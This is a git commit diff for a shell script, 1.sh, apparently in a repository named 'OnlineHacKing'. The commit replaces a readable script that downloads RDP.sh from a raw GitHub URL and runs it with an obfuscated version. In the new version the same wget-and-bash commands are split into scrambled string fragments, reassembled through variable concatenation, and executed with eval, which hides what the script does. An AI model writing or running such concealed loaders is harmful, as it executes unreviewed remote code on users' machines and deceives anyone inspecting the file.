022d3e636a471bb88e095d483c47812813e53957
Online Hacking <45653647+OnlineHacKing@users.noreply.github.com>
2022-02-08 12:20:15 +0530

    Update 1.sh

--- OnlineHacKing/1.sh
+++ OnlineHacKing/1.sh
@@ -1,4 +1,3 @@
-#!/bin/bash
-echo ""
-wget -q --show-progress https://raw.githubusercontent.com/Online-Hacking/Mr-OnlineHacking/main/OnlineHacking/SUMAN/Cloud_Desktop/RDP.sh
-bash RDP.sh
+z="
+";Pz='t.co';cz='/SUM';Gz='rogr';Cz='wget';gz='ktop';Bz=' ""';Wz='neHa';hz='/RDP';jz='clea';Dz=' -q ';Uz='/Mr-';fz='_Des';Zz='in/O';iz='.sh';Kz='raw.';Mz='ubus';Sz='-Hac';Lz='gith';Xz='ckin';mz=' RDP';Oz='nten';Vz='Onli';kz='r';Fz='ow-p';dz='AN/C';bz='eHac';Qz='m/On';Tz='king';Rz='line';Yz='g/ma';Ez='--sh';az='nlin';ez='loud';Jz='s://';Hz='ess ';lz='bash';Iz='http';Nz='erco';Az='echo';
+eval "$Az$Bz$z$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$Tz$cz$dz$ez$fz$gz$hz$iz$z$jz$kz$z$lz$mz$iz"
